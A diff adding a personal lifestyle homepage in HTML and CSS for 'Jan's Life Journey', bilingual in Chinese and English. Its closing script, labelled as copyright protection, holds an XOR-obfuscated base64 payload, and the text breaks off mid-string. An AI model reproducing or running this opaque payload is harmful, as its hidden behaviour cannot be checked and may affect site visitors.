@@ -1,0 +1,1006 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=1280">
+    <title>Jan 的生活 | Jan's Life Journey</title>
+    <!-- Font Awesome 图标库 -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts 原图手写艺术体与优雅衬线体 -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Caveat:wght@500;600;700&family=Noto+Serif+SC:wght@400;600;700&display=swap" rel="stylesheet">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+/* ==========================================
+   📱 手机端精准适配 (无 !important 纯净版)
+   ========================================== */
+@media screen and (max-width: 768px) {
+  /* 1. 顶部菜单：允许换行，防止右侧被切 */
+  nav, .nav-links {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    gap: 8px;
+  }
+
+  /* 2. 主视觉容器：解除绝对定位，改为上下流式排版 */
+  .hero-section,
+  .hero-card,
+  div[class*="hero"] {
+    display: flex;
+    flex-direction: column;
+    align-items: flex-start; /* 严格保持左对齐 */
+    justify-content: flex-start;
+    text-align: left;         /* 标题与文字严格靠左 */
+    padding: 20px 15px;
+    position: relative;
+    width: 100%;
+  }
+
+  /* 3. 左侧文字与社交 Logo：固定靠左显示 */
+  .hero-content,
+  .hero-text,
+  .social-icons {
+    width: 100%;
+    max-width: 100%;
+    margin-left: 0;
+    margin-right: auto;
+    text-align: left;         /* 确保“Jan的生活”与社交图标靠左 */
+  }
+
+  .social-icons {
+    display: flex;
+    justify-content: flex-start; /* 图标严格靠左 */
+    gap: 10px;
+    margin-top: 15px;
+  }
+
+  /* 4. 播放按钮：居中显示在画面中间 */
+  .play-btn,
+  div[class*="play"] {
+    position: relative;
+    z-index: 10;
+    margin: 20px auto;        /* 按钮自动居中 */
+    display: block;
+    cursor: pointer;
+  }
+
+  /* 5. 右侧人像图片：顺畅排在下方，完整展示 */
+  .hero-section img,
+  div[class*="hero"] img {
+    position: static;
+    width: 100%;
+    height: auto;
+    object-fit: contain;
+    margin-top: 10px;
+  }
+}
+        body {
+            background-color: #eef0f2;
+            color: #333333;
+            font-family: -apple-system, BlinkMacSystemFont, "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", sans-serif;
+            padding: 20px 0;
+        }
+
+        .site-wrapper {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: #f7f8fa;
+            border-radius: 24px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.06);
+            overflow: hidden;
+        }
+
+        /* 1. 顶部导航栏 (Header) */
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 25px 40px;
+            background: #ffffff;
+        }
+
+        .logo-area {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .logo-main {
+            font-family: 'Caveat', 'Noto Serif SC', cursive, serif;
+            font-size: 32px;
+            font-weight: 700;
+            color: #1a1a1a;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            line-height: 1;
+        }
+
+        .logo-leaf {
+            color: #556b2f;
+            font-size: 22px;
+        }
+
+        .logo-sub {
+            font-family: 'Caveat', cursive;
+            font-size: 14px;
+            color: #777777;
+            margin-top: 3px;
+        }
+
+        .nav-menu {
+            display: flex;
+            align-items: center;
+            gap: 28px;
+        }
+
+        .nav-item {
+            text-decoration: none;
+            color: #444444;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            transition: color 0.2s;
+        }
+
+        .nav-item .zh {
+            font-size: 15px;
+            font-weight: 600;
+        }
+
+        .nav-item .en {
+            font-size: 10px;
+            color: #888888;
+            letter-spacing: 0.5px;
+            margin-top: 2px;
+            text-transform: uppercase;
+        }
+
+        .nav-item.active .zh {
+            color: #1a1a1a;
+            border-bottom: 2px solid #556b2f;
+            padding-bottom: 2px;
+        }
+
+        .nav-item.active .en {
+            color: #556b2f;
+        }
+
+        .nav-right-tools {
+            display: flex;
+            align-items: center;
+            gap: 18px;
+        }
+
+        .nav-icons {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            color: #444;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        /* 重点：中/EN 语言切换按钮组件 */
+        .lang-switcher {
+            display: flex;
+            background: #f0f2f5;
+            border-radius: 16px;
+            padding: 3px;
+            border: 1px solid #e0e0e0;
+        }
+
+        .lang-btn {
+            border: none;
+            background: transparent;
+            padding: 4px 10px;
+            font-size: 12px;
+            font-weight: 700;
+            color: #666;
+            cursor: pointer;
+            border-radius: 12px;
+            transition: all 0.2s ease;
+        }
+
+        .lang-btn.active {
+            background: #4a5d23;
+            color: #ffffff;
+            box-shadow: 0 2px 6px rgba(74, 93, 35, 0.2);
+        }
+
+        /* 2. 主展示海报区 */
+        .hero-section {
+            padding: 0 40px;
+            margin-top: 10px;
+        }
+
+        .hero-card {
+            position: relative;
+            border-radius: 20px;
+            height: 480px;
+            display: flex;
+            align-items: center;
+            padding-left: 60px;
+            overflow: hidden;
+        }
+
+        .hero-overlay {
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(90deg, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0) 100%);
+        }
+
+        .hero-content {
+            position: relative;
+            z-index: 2;
+            max-width: 500px;
+        }
+
+        .hero-title {
+            font-family: 'Caveat', 'Noto Serif SC', cursive, serif;
+            font-size: 56px;
+            font-weight: 700;
+            color: #111111;
+            line-height: 1.1;
+            margin-bottom: 5px;
+        }
+
+        .hero-subtitle {
+            font-family: 'Caveat', cursive;
+            font-size: 28px;
+            color: #222222;
+            margin-bottom: 20px;
+        }
+
+        .hero-desc {
+            font-size: 14px;
+            color: #444444;
+            line-height: 1.8;
+            margin-bottom: 25px;
+        }
+
+        .btn-green {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: #4a5d23;
+            color: #ffffff;
+            padding: 12px 28px;
+            border-radius: 30px;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: background 0.3s;
+            margin-bottom: 25px;
+        }
+
+        .btn-green:hover {
+            background: #3b4b1b;
+        }
+
+        .social-btns {
+            display: flex;
+            gap: 12px;
+        }
+
+        .social-circle {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: #ffffff;
+            color: #333333;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+            font-size: 14px;
+            box-shadow: 0 3px 8px rgba(0,0,0,0.1);
+            transition: transform 0.2s;
+        }
+
+        .social-circle:hover {
+            transform: translateY(-2px);
+        }
+
+        /* 3. 卡片分类列表区 */
+        .cards-container {
+            padding: 40px;
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 24px;
+        }
+
+        .cat-card {
+            background: #ffffff;
+            border-radius: 20px;
+            padding: 30px 24px;
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.02);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .cat-img-wrapper {
+            width: 140px;
+            height: 140px;
+            border-radius: 50%;
+            overflow: hidden;
+            margin-bottom: 20px;
+            box-shadow: 0 6px 16px rgba(0,0,0,0.08);
+        }
+
+        .cat-img-wrapper img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .cat-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 4px;
+        }
+
+        .cat-sub {
+            font-family: 'Caveat', cursive;
+            font-size: 16px;
+            color: #666666;
+            margin-bottom: 12px;
+        }
+
+        .cat-desc {
+            font-size: 13px;
+            color: #666666;
+            line-height: 1.6;
+            margin-bottom: 20px;
+            min-height: 42px;
+        }
+
+        .link-more {
+            font-size: 13px;
+            font-weight: 700;
+            color: #1a1a1a;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        /* 4. 关于我 & 最新分享区 */
+        .about-share-section {
+            padding: 0 40px 40px 40px;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 24px;
+        }
+
+        .about-box {
+            background: #ffffff;
+            border-radius: 20px;
+            padding: 35px;
+            display: flex;
+            gap: 25px;
+            align-items: center;
+        }
+
+        .about-avatar {
+            width: 150px;
+            height: 200px;
+            border-radius: 100px;
+            overflow: hidden;
+            flex-shrink: 0;
+        }
+
+        .about-avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .about-text h3 {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            color: #1a1a1a;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .about-text p {
+            font-size: 13px;
+            color: #666666;
+            line-height: 1.8;
+            margin-bottom: 18px;
+        }
+
+        .btn-outline {
+            display: inline-block;
+            padding: 8px 20px;
+            border: 1px solid #333333;
+            border-radius: 20px;
+            color: #333333;
+            text-decoration: none;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        .share-box {
+            background: #ffffff;
+            border-radius: 20px;
+            padding: 30px;
+        }
+
+        .share-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .share-header h3 {
+            font-size: 18px;
+            font-weight: 700;
+            color: #1a1a1a;
+        }
+
+        .view-all {
+            font-size: 11px;
+            font-weight: 700;
+            color: #555555;
+            text-decoration: none;
+            letter-spacing: 0.5px;
+        }
+
+        .share-list {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .share-item {
+            display: flex;
+            gap: 15px;
+            align-items: center;
+        }
+
+        .share-img {
+            width: 60px;
+            height: 60px;
+            border-radius: 12px;
+            overflow: hidden;
+            flex-shrink: 0;
+        }
+
+        .share-img img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .share-info h4 {
+            font-size: 14px;
+            font-weight: 600;
+            color: #222222;
+            margin-bottom: 4px;
+        }
+
+        .share-info span {
+            font-size: 11px;
+            color: #888888;
+        }
+
+        /* 5. 三图相框与名言金句 */
+        .quote-gallery-section {
+            padding: 0 40px 40px 40px;
+            position: relative;
+        }
+
+        .gallery-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            position: relative;
+        }
+
+        .gallery-item {
+            height: 220px;
+            border-radius: 16px;
+            overflow: hidden;
+        }
+
+        .gallery-item img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .quote-overlay-card {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    /* 1. 将 0.92 改为 0.35（35%不透明度），透明度更高，能清楚看到背后的图片 */
+    background: rgba(255, 255, 255, 0.35); 
+    /* 2. 调低模糊度或保留毛玻璃质感，让背景图片更清晰 */
+    backdrop-filter: blur(3px); 
+    padding: 30px 50px;
+    border-radius: 16px;
+    text-align: center;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.12);
+    width: 60%;
+    z-index: 5;
+}
+        .quote-overlay-card p {
+            font-family: 'Noto Serif SC', serif;
+            font-size: 20px;
+            font-weight: 600;
+            color: #1a1a1a;
+            line-height: 1.6;
+        }
+
+        /* 6. 页脚 Footer */
+        .footer-section {
+            background: #dcdedb;
+            padding: 35px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .subscribe-box h4 {
+            font-size: 14px;
+            font-weight: 700;
+            color: #222;
+            margin-bottom: 4px;
+        }
+
+        .subscribe-box p {
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 12px;
+        }
+
+        .subscribe-form {
+            display: flex;
+            gap: 10px;
+        }
+
+        .subscribe-form input {
+            padding: 8px 16px;
+            border-radius: 6px;
+            border: 1px solid #ccc;
+            font-size: 12px;
+            outline: none;
+            width: 220px;
+        }
+
+        .subscribe-form button {
+            background: #4a5d23;
+            color: #fff;
+            border: none;
+            padding: 8px 20px;
+            border-radius: 6px;
+            font-size: 12px;
+            cursor: pointer;
+        }
+
+        .wa-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: #4a5d23;
+            color: #ffffff;
+            padding: 9px 22px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 600;
+            text-decoration: none;
+            transition: background 0.2s;
+        }
+
+        .wa-btn i {
+            font-size: 17px;
+        }
+
+        .wa-btn:hover {
+            background: #25d366;
+        }
+
+        /* 按“关注我”后，WhatsApp 按钮轻轻闪两下 */
+        .wa-btn.wa-glow {
+            animation: waGlow 0.9s ease-in-out 2;
+        }
+
+        @keyframes waGlow {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(37, 211, 102, 0); transform: scale(1); }
+            50% { box-shadow: 0 0 0 10px rgba(37, 211, 102, 0.35); transform: scale(1.06); }
+        }
+
+        .copyright {
+            font-size: 12px;
+            color: #555555;
+            max-width: 520px;
+            text-align: right;
+            line-height: 1.7;
+        }
+
+/* ===== 手机端：整页完整适配（只在手机宽度生效，电脑版不变）===== */
+@media screen and (max-width:768px){
+ body{padding:10px 0;overflow-x:hidden}
+ .navbar{flex-direction:column;align-items:center;gap:12px;padding:16px 14px}
+ .logo-area{align-items:center}
+ .logo-main{font-size:28px;white-space:nowrap}
+ .nav-menu{flex-wrap:wrap;justify-content:center;gap:10px 18px}
+ .cards-container{grid-template-columns:1fr;padding:20px 14px;gap:16px}
+ .about-share-section{grid-template-columns:1fr;padding:0 14px 20px}
+ .about-box{flex-direction:column;text-align:center;padding:24px 18px}
+ .about-text h3{justify-content:center}
+ .share-box{padding:22px 18px}
+ .quote-gallery-section{padding:0 14px 20px}
+ .gallery-grid{grid-template-columns:1fr;gap:12px}
+ .gallery-item{height:160px}
+ .quote-overlay-card{width:86%;padding:18px 20px}
+ .quote-overlay-card p{font-size:16px}
+ .footer-section{flex-direction:column;align-items:flex-start;gap:18px;padding:26px 18px}
+ .copyright{text-align:left;max-width:100%}
+}
+    </style>
+    <script>
+/* 首页设计与程序 © 2026 Jan Chia（Jan 的生活）保留所有权利。禁止复制、修改或模仿使用。
+   Homepage design & code © 2026 Jan Chia. All rights reserved. Copying, modifying or imitating is prohibited. */
+(function(){var k=[28, 238, 119, 21, 4, 168, 83, 203, 104, 161, 232, 207, 47, 103, 47, 90, 153, 46, 71, 74, 176, 157, 20, 164, 170, 88, 78, 18, 66, 244, 193],d=atob("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